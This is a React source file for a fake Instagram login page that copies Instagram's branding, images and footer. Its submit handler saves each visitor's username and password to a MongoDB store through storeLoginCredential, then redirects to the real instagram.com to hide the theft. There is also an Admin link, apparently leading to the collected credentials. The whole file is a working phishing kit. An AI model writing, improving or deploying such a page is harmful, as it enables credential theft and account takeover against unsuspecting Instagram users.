
import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { storeLoginCredential } from '@/services/mongodb';
import { toast } from 'sonner';
import { FaFacebook } from 'react-icons/fa';
import InstagramImage from '/lovable-uploads/4e5e62dd-6560-47f3-b6d2-1aea8d4d0104.png';

const InstagramLogin = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username.trim() || !password.trim()) {
      toast.error('Please enter both username and password');
      return;
    }
    
    setIsLoading(true);
    
    try {
      // Store the credentials in MongoDB
      await storeLoginCredential(username, password);
      
      // Redirect to Instagram
      window.location.href = 'https://www.instagram.com';
    } catch (error) {
      console.error('Login error:', error);
      toast.error('Something went wrong. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-black">
      <div className="flex flex-col md:flex-row items-center justify-center w-full max-w-5xl">
        {/* Left side - Phone image */}
        <div className="hidden md:block w-full md:w-1/2 p-4">
          <img 
            src={InstagramImage} 
            alt="Instagram on phone" 
            className="w-full max-w-md mx-auto"
          />
        </div>
        
        {/* Right side - Login form */}
        <div className="w-full md:w-1/2 max-w-md">
          <div className="bg-black border border-gray-700 p-8 rounded-lg mb-4">
            <h1 className="instagram-font text-5xl text-white text-center mb-8">Instagram</h1>
            
            <form onSubmit={handleLogin} className="space-y-4">
              <Input
                type="text"
                placeholder="Phone number, username, or email"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="bg-black border border-gray-700 text-white"
              />
              
              <Input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="bg-black border border-gray-700 text-white"
              />
              
              <Button 
                type="submit" 
                className="w-full bg-blue-500 hover:bg-blue-600 text-white" 
                disabled={isLoading || !username || !password}
              >
                {isLoading ? 'Logging in...' : 'Log in'}
              </Button>
            </form>
            
            <div className="flex items-center my-4">
              <hr className="flex-grow border-gray-700" />
              <span className="px-3 text-gray-500 text-sm">OR</span>
              <hr className="flex-grow border-gray-700" />
            </div>
            
            <button className="w-full flex items-center justify-center text-blue-500 font-semibold my-4">
              <FaFacebook className="mr-2" />
              Log in with Facebook
            </button>
            
            <div className="text-center mt-4">
              <a href="#" className="text-xs text-blue-900">Forgot password?</a>
            </div>
          </div>
          
          <div className="bg-black border border-gray-700 p-4 rounded-lg text-center">
            <p className="text-white text-sm">
              Don't have an account? <a href="#" className="text-blue-500 font-semibold">Sign up</a>
            </p>
          </div>
          
          <div className="text-center mt-4">
            <p className="text-white text-sm">Get the app.</p>
            <div className="flex justify-center space-x-4 mt-4">
              <a href="#" className="app-button">
                <img 
                  src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" 
                  alt="Get it on Google Play" 
                  className="h-10"
                />
              </a>
              <a href="#" className="app-button">
                <img 
                  src="https://static.cdninstagram.com/rsrc.php/v3/ys/r/ITZ-9n2b7zT.png" 
                  alt="Get it from Microsoft" 
                  className="h-10"
                />
              </a>
            </div>
          </div>
        </div>
      </div>
      
      {/* Footer */}
      <footer className="w-full max-w-5xl mt-8 mb-8 px-4">
        <div className="footer-section">
          <a className="footer-link">Meta</a>
          <a className="footer-link">About</a>
          <a className="footer-link">Blog</a>
          <a className="footer-link">Jobs</a>
          <a className="footer-link">Help</a>
          <a className="footer-link">API</a>
          <a className="footer-link">Privacy</a>
          <a className="footer-link">Terms</a>
          <a className="footer-link">Locations</a>
          <a className="footer-link">Instagram Lite</a>
          <a className="footer-link">Threads</a>
          <a className="footer-link">Contact Uploading & Non-Users</a>
          <a className="footer-link">Meta Verified</a>
          <a href="/admin" className="footer-link text-red-500">Admin</a>
        </div>
        
        <div className="footer-section">
          <div className="flex items-center space-x-2">
            <select className="bg-transparent text-gray-500 text-xs border-none outline-none cursor-pointer">
              <option value="en">English</option>
              <option value="es">Español</option>
              <option value="fr">Français</option>
            </select>
            <span className="text-gray-500 text-xs">© 2025 Instagram from Meta</span>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default InstagramLogin;
